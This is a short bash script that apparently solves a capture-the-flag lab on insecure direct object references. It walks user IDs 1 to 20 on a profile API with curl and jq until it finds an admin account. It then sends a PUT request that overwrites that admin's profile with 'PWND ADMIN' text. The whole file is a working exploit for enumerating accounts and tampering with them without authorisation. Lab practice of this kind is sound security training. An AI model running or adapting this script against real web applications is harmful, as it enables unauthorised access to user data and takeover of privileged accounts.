#! /bin/bash

URL='http://83.136.250.104:59182'
DIR='/profile/api.php/profile'

for uid in {1..20}
do
	Payload=$URL/$DIR/$uid

	if [ -z "$(curl $Payload 2> /dev/null | grep admin)" ]
	then
		echo "[$] User $(curl $Payload 2> /dev/null | jq -r .full_name) NOT Admin"

	else
		Cookie="Cookie: role=$(curl $Payload 2> /dev/null | jq -r .role)"
		Json_Payload="
		{
			\"uid\":$(curl $Payload 2> /dev/null | jq -r .uid), 
			\"uuid\":\"$(curl $Payload 2> /dev/null | jq -r .uuid)\",
			\"role\":\"$(curl $Payload 2> /dev/null | jq -r .role)\",
			\"full_name\":\"PWND ADMIN\",
			\"email\":\"flag@idor.htb\",
			\"about\":\"I have been PWND by n0tharbor\"
		}"

		curl -X PUT "$Payload" -d "$Json_Payload" &> /dev/null
		echo "[!] Admin Popped visit $URL/profile/index.php for flag" 
		exit
	fi
done